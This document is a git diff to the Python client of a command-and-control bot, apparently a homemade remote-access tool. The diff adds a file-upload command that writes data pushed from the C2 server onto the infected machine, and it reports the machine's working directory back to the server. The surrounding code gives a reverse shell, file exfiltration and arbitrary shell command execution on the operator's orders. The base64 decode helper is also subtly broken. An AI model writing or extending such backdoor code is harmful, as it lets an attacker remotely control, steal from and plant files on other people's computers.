@@ -49,6 +49,19 @@ def reverse_shell(socket, os_family):
         except KeyboardInterrupt:
             s.close()
 
+def base64_decode(data):
+    """This function removes the delimter from the encoded data as well as the padding
+    Args:
+        data (bytes): The encoded data
+    Returns:
+        _type_: bytes
+    """
+    # Establish the delimiter
+    delim = b'!!#@'
+    # Remove the delimiter
+    data = data.split(delim)[0]
+    # Remove the padding and return the decoded data
+    return base64.b64decode(data).replace(b'=', b'')
 
 def base64_encode(data):
     """This function encodes data in base64 and adds padding to the end of the string if needed, as well as adding a delimiter to the end of the string
@@ -77,6 +90,29 @@ def send_file(socket, file_name):
     except:
         socket.sendall(base64_encode(b"[-] File not found"))
 
+def receive_data(socket):
+    """This function receives the data from the socket and returns it
+    Args:
+        socket (_type_): The socket to receive data from
+    Returns:
+        _type_: bytes
+    """
+    # Create a list to hold the fragments of data, dramatically increases speed
+    fragments = []
+    # While loop to receive the data
+    while True:
+        # Each fragment is 4096 bytes
+        chunk = socket.recv(4096)
+        # If the length of the chunk is less than 4096, we have received all the data
+        if  len(chunk) < 4096:
+            # Append the last chunk to the list and break out of the loop
+            fragments.append(chunk)
+            break
+        # Append the chunk to the list
+        fragments.append(chunk)
+    full_data = b''.join(fragments)
+    return full_data
+
 def main(ip, ports):
     """This function creates a socket and connects to the C2 server
     Args:
@@ -96,8 +132,12 @@ def main(ip, ports):
             print(f"Connected on port {port}")
             os_family = platform.system()
             c2_bot.sendall(base64_encode(os_family.encode()))
+            # c2_bot.sendall(base64_encode(b"Connected"))
+            current_dir = os.getcwd()
+            c2_bot.sendall(base64_encode(current_dir.encode()))
             while True:
                 command = (c2_bot.recv(4096)).decode()
+                # print(command)
                 file_name = ""
                 # print(command)
                 if command.lower() == "quit":
@@ -109,6 +149,19 @@ def main(ip, ports):
                     send_file(c2_bot, file_name)
                 elif "shell" in command:
                     reverse_shell(c2_bot, os_family)
+                elif "upload" in command:
+                    print("upload")
+                    print(command)
+                    # TODO: Implement upload functionality
+                    file_name = command.split(" ")[1]
+                    file_destination = command.split(" ")[2]
+                    command = command.split(" ")[0]
+                    print(f"File name: {file_name}\nFile destination: {file_destination}")
+                    data = receive_data(c2_bot)
+                    print("Received data")
+                    data = base64_decode(data)
+                    with open(file_destination, "wb") as f:
+                        f.write(data)
                 else:
                     result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                     return_code = result.returncode
